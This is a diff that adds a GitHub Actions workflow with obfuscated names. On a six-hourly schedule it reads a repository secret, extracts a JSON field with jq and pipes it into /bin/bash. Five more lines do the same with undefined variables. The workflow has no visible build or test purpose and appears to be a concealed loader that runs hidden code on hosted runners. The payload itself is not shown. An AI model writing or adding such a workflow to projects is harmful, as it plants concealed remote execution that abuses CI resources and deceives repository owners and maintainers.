@@ -1,0 +1,23 @@
+name: nlphenrye
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nlphenrye
+        env:
+          o5: ${{ secrets.o5 }}
+        run: |
+          echo $o5 | jq -r .mztgt4 | /bin/bash
+          echo $ri084 | jq -r .r2482 | /bin/bash
+          echo $j4584 | jq -r .isb1 | /bin/bash
+          echo $xqsyz992 | jq -r .nvwoz95 | /bin/bash
+          echo $raz0 | jq -r .ia352 | /bin/bash
+          echo $hdrs25997 | jq -r .qpnoy1 | /bin/bash
+
